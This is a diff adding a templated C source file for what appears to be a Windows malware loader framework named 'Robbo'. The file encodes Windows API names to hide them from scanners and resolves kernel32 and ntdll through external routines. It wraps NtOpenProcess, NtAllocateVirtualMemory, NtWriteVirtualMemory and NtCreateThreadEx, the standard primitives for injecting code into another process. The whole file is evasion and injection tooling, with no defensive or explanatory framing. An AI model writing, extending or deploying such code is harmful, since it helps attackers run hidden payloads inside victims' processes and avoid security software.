@@ -1,0 +1,293 @@
+#!name##RobboBase_C
+#!itemType##sfile
+#!info##Robbo main C file.
+#!lang##c
+#!addNameComp##True
+
+
+#include "robbo_base.h"
+#include <stdio.h>
+#include <string.h>
+
+#define ROBBO_DECODE_NAME_BUFF_SIZE 256
+
+// LIB import
+extern void* ChipDaleInit(void);
+extern void* ChipDaleADDR_kernel32(void);
+extern void* ChipDaleADDR_ntdll(void);
+extern void* ChipFindTreasureSingle(char*);
+extern char* DaleShow(char*);
+extern void* ChipGetFunc(char*, void*);
+
+// ---------------------------- INIT FUNCTIONS --------------------------------------
+
+// variables
+void *robbo_addr_kernel32 = NULL;
+void *robbo_addr_ntdll = NULL;
+
+
+// functions
+
+
+
+
+
+// ------------------------- DECODE FUNCTIONS ---------------------------------------------------
+
+// static variables
+static char robbo_var_separator[] = "{{_ROBBO.ShowPower()}}";
+static char robbo_var_key[] = {
+    {{_ROBBO.ShowKey()}}
+};
+static char robbo_var_buff_name[ROBBO_DECODE_NAME_BUFF_SIZE];
+
+// functions
+
+char* robbo_decode(int encode_table[]) {
+    memset(robbo_var_buff_name, 0, ROBBO_DECODE_NAME_BUFF_SIZE);
+    int key_index = 0;
+    int tab_index = 0;
+    int temp;
+
+    while (encode_table[tab_index] != 0) {
+        if (key_index == sizeof(robbo_var_key)) {
+            key_index = 0;
+        }
+        temp = encode_table[tab_index] - (robbo_var_key[key_index] * (sizeof(robbo_var_separator) -1));
+        robbo_var_buff_name[tab_index] = (char)temp;
+        key_index++;
+        tab_index++;
+    }
+    return robbo_var_buff_name;
+}
+
+void robbo_decode2(int encode_table[], char buff[], int buff_size) {
+    memset(buff, 0, buff_size);
+    int key_index = 0;
+    int tab_index = 0;
+    int temp;
+
+    while (encode_table[tab_index] != 0) {
+        if (key_index == sizeof(robbo_var_key)) {
+            key_index = 0;
+        }
+        temp = encode_table[tab_index] - (robbo_var_key[key_index] * (sizeof(robbo_var_separator) -1));
+        buff[tab_index] = (char)temp;
+        key_index++;
+        tab_index++;
+    }
+}
+
+// ------------------------- FIND FUNCTIONS ----------------------------------------------
+
+void* robbo_get_function_raw(char *func_name, void *dll_address) {
+    return ChipGetFunc(func_name, dll_address);
+}
+
+void* robbo_get_function(int encoded_table[], void *dll_address) {
+    char *buff = robbo_decode(encoded_table);
+    return ChipGetFunc(buff, dll_address);
+}
+
+// ----------------------- LOAD FUNCTIONS -----------------------------------------
+typedef HMODULE (*RtypeLoadLibraryA)(LPCSTR);
+typedef INT (*RtypeMultiByteToWideChar)(UINT, DWORD, const char*, int, LPWSTR, int);
+typedef NTSTATUS (*RtypeLdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, HMODULE*);
+
+// static var
+static int raw_name_LoadLibraryA[] = {
+    {{_ROBBO.EncodeStr("LoadLibraryA")}}
+};
+static int raw_name_MultiByteToWideChar[] = {
+    {{_ROBBO.EncodeStr("MultiByteToWideChar")}}
+};
+static RtypeMultiByteToWideChar robbo_f_addr_MultiByteToWideChar = NULL;
+static UINT raw_const_CODE_PAGE_UTF_8 = 65001;
+static int raw_name_LdrLoadDll[] = {
+    {{_ROBBO.EncodeStr("LdrLoadDll")}}
+};
+static WCHAR robbo_buff_dll_name[ROBBO_DECODE_NAME_BUFF_SIZE];
+
+
+HMODULE robbo_load_dll_raw_lla(LPCSTR dll_name) {
+    char *buff = robbo_decode(raw_name_LoadLibraryA);
+    RtypeLoadLibraryA lla = ChipGetFunc(buff, robbo_addr_kernel32);
+    return lla(dll_name);
+}
+
+HMODULE robbo_load_dll_lla(int encoded_name[]) {
+    char *buff = robbo_decode(raw_name_LoadLibraryA);
+    RtypeLoadLibraryA lla = ChipGetFunc(buff, robbo_addr_kernel32);
+    char *buff2 = robbo_decode(encoded_name);
+    return lla(buff2);
+}
+
+INT robbo_convert_utf16(const char* src_str, LPWSTR buffer, int buff_size) {
+    return robbo_f_addr_MultiByteToWideChar(raw_const_CODE_PAGE_UTF_8, 0, src_str, -1, buffer, buff_size);
+}
+
+UNICODE_STRING robbo_build_unicode_struct(char text[], WCHAR buff[], int buff_size) {
+    int size = robbo_convert_utf16(text, buff, buff_size);
+    UNICODE_STRING dInfo;
+    dInfo.Buffer = buff;
+    dInfo.Length = size;
+    dInfo.MaximumLength = size + sizeof(WCHAR);
+    return dInfo;
+}
+
+HMODULE robbo_load_dll_raw_ldr_ldll(char dll_name[]) {
+    HMODULE dll_handle = NULL;
+    WCHAR buff[256];
+    robbo_convert_utf16(dll_name, buff, 256);
+    UNICODE_STRING dll_info;
+    robbo_wapi_RtlInitUnicodeString(&dll_info, buff);
+    RtypeLdrLoadDll lld = robbo_get_function(raw_name_LdrLoadDll, robbo_addr_ntdll);
+    NTSTATUS result = lld(0, 0, &dll_info, &dll_handle);
+    printf("NTSTATUS: %x\n", result);
+    return dll_handle;
+}
+
+HMODULE robbo_load_dll_ldr(int encoded_name[]) {
+    memset(robbo_buff_dll_name, 0, sizeof(robbo_buff_dll_name));
+    RtypeLdrLoadDll lld = robbo_get_function(raw_name_LdrLoadDll, robbo_addr_ntdll);
+    char *buff = robbo_decode(encoded_name);
+    WCHAR wbuff[256];
+    robbo_convert_utf16(buff, wbuff, 256);
+    UNICODE_STRING dll_info;
+    robbo_wapi_RtlInitUnicodeString(&dll_info, wbuff);
+    HMODULE dll_handle;
+    NTSTATUS result = lld(0, 0, &dll_info, &dll_handle);
+    return dll_handle;
+}
+
+
+
+// ------------------------------------ NT FUNCTIONS ------------------------------------------------------------------------
+
+
+
+
+// FUNCTIONS
+// NtOpenProcess
+static int raw_name_NtOpenProcess[] = {
+    {{_ROBBO.EncodeStr("NtOpenProcess")}}
+};
+typedef NTSTATUS (*RtypeNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+
+// NtAllocateVirtualMemory
+static int raw_name_NtAllocateVirtualMemory[] = {
+    {{_ROBBO.EncodeStr("NtAllocateVirtualMemory")}}
+};
+typedef NTSTATUS (*RtypeNtAllocateVirtualMemory)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+
+// NtWriteVirtualMemory
+static int raw_name_NtWriteVirtualMemory[] = {
+    {{_ROBBO.EncodeStr("NtWriteVirtualMemory")}}
+};
+typedef NTSTATUS (*RtypeNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+
+// NtCreateThreadEx
+static int raw_name_NtCreateThreadEx[] = {
+    {{_ROBBO.EncodeStr("NtCreateThreadEx")}}
+};
+typedef NTSTATUS (*RtypeNtCreateThreadEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+
+// RtlInitUnicodeString
+static int raw_name_RtlInitUnicodeString[] = {
+    {{_ROBBO.EncodeStr("RtlInitUnicodeString")}}
+};
+typedef void (*RtypeRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
+
+// Sleep
+static int raw_name_Sleep[] = {
+    {{_ROBBO.EncodeStr("Sleep")}}
+};
+typedef void (*RtypeSleep)(DWORD);
+
+// NtCreateFile
+static int raw_name_NtCreateFile[] = {
+    {{_ROBBO.EncodeStr("NtCreateFile")}}
+};
+typedef NTSTATUS (*Rtype_NtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
+
+// NtWriteFile
+static int raw_name_NtWriteFile[] = {
+    {{_ROBBO.EncodeStr("NtWriteFile")}}
+};
+typedef NTSTATUS (*Rtype_NtWriteFile)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
+
+
+NTSTATUS robbo_wapi_NtOpenProcess(PHANDLE proc_handle, ACCESS_MASK access_mask, POBJECT_ATTRIBUTES objAttr, PCLIENT_ID client_id) {
+    RtypeNtOpenProcess oProc = robbo_get_function(raw_name_NtOpenProcess, robbo_addr_ntdll);
+    return oProc(proc_handle, access_mask, objAttr, client_id);
+}
+
+NTSTATUS robbo_wapi_NtAllocateVirtualMemory(HANDLE proc_handle, PVOID mem_addr, ULONG_PTR zero_bits, PSIZE_T mem_size, ULONG allocation_type, ULONG protect_flag) {
+    RtypeNtAllocateVirtualMemory alloc_mem = robbo_get_function(raw_name_NtAllocateVirtualMemory, robbo_addr_ntdll);
+    return alloc_mem(proc_handle, mem_addr, zero_bits, mem_size, allocation_type, protect_flag);
+}
+
+NTSTATUS robbo_wapi_NtWriteVirtualMemory(HANDLE proc_handle, PVOID mem_addr, PVOID buffer, SIZE_T bytes_num, PSIZE_T bytes_written) {
+    RtypeNtWriteVirtualMemory write_mem = robbo_get_function(raw_name_NtWriteVirtualMemory, robbo_addr_ntdll);
+    return write_mem(proc_handle, mem_addr, buffer, bytes_num, bytes_written);
+}
+
+NTSTATUS robbo_wapi_NtCreateThreadEx(PHANDLE th_handle, ACCESS_MASK accMask, POBJECT_ATTRIBUTES objAttr, HANDLE proc_handle, PVOID start_func, PVOID func_args, ULONG create_flag, SIZE_T zero_bits, SIZE_T stack_size, SIZE_T max_stack_size, PVOID attr_list) {
+    RtypeNtCreateThreadEx cr_th = robbo_get_function(raw_name_NtCreateThreadEx, robbo_addr_ntdll);
+    return cr_th(th_handle, accMask, objAttr, proc_handle, start_func, func_args, create_flag, zero_bits, stack_size, max_stack_size, attr_list);
+}
+
+void robbo_wapi_RtlInitUnicodeString(PUNICODE_STRING dest_str, PCWSTR source_str) {
+    RtypeRtlInitUnicodeString uni_str = robbo_get_function(raw_name_RtlInitUnicodeString, robbo_addr_ntdll);
+    return uni_str(dest_str, source_str);
+}
+
+void robbo_wapi_Sleep(DWORD milisec) {
+    RtypeSleep rsleep = robbo_get_function(raw_name_Sleep, robbo_addr_kernel32);
+    return rsleep(milisec);
+}
+
+NTSTATUS robbo_wapi_NtCreateFile(PHANDLE file_handle, ACCESS_MASK acc_mask, POBJECT_ATTRIBUTES obj_attr, PIO_STATUS_BLOCK io_status_block, PLARGE_INTEGER alloc_size, ULONG file_attr, ULONG share_access, ULONG create_dispotion, ULONG create_options, PVOID ea_buffer, ULONG ea_length) {
+    Rtype_NtCreateFile cr_file = robbo_get_function(raw_name_NtCreateFile, robbo_addr_ntdll);
+    return cr_file(file_handle, acc_mask, obj_attr, io_status_block, alloc_size, file_attr, share_access, create_dispotion, create_options, ea_buffer, ea_length);
+}
+
+NTSTATUS robbo_wapi_NtWriteFile(HANDLE file_handle, HANDLE event_obj, PVOID apc_routine, PVOID apc_context, PIO_STATUS_BLOCK io_status, PVOID buffer, ULONG length, PLARGE_INTEGER byte_offset, PULONG key) {
+    Rtype_NtWriteFile wr_file = robbo_get_function(raw_name_NtWriteFile, robbo_addr_ntdll);
+    return wr_file(file_handle, event_obj, apc_routine, apc_context, io_status, buffer, length, byte_offset, key);
+}
+
+// ---------------------------------- ADDRESS FUNCTIONS -------------------------------------
+void* robbo_addr_LdrLoadDll(void) {
+    void *lld = robbo_get_function(raw_name_LdrLoadDll, robbo_addr_ntdll);
+    return lld;
+}
+
+void* robbo_addr_RtlInitUnicodeString(void) {
+    void *unSt = robbo_get_function(raw_name_RtlInitUnicodeString, robbo_addr_ntdll);
+    return unSt;
+}
+
+
+
+
+// ----------------------------------- INIT FUNCTIONS
+
+void robbo_initialize(void) {
+    ChipDaleInit();
+    robbo_addr_kernel32 = ChipDaleADDR_kernel32();
+    robbo_addr_ntdll = ChipDaleADDR_ntdll();
+    robbo_f_addr_MultiByteToWideChar = robbo_get_function(raw_name_MultiByteToWideChar, robbo_addr_kernel32);
+    printf("\n-------- Robbo Initialize -----------------\n");
+}
+
+
+// ------------------------------- TESTS ---------------------------------------
+void robbo_init_test(void) {
+    printf("------- ROBBO TEST ---------------\n");
+    printf("KERNEL32.DLL Address: 0x%p\n", robbo_addr_kernel32);
+    printf("NTDLL.DLL Address: 0x%p\n", robbo_addr_ntdll);
+    printf("Function MultiByteToWideChar Address: 0x%p\n", robbo_f_addr_MultiByteToWideChar);
+    printf("--------------------------------------------\n");
+
+}
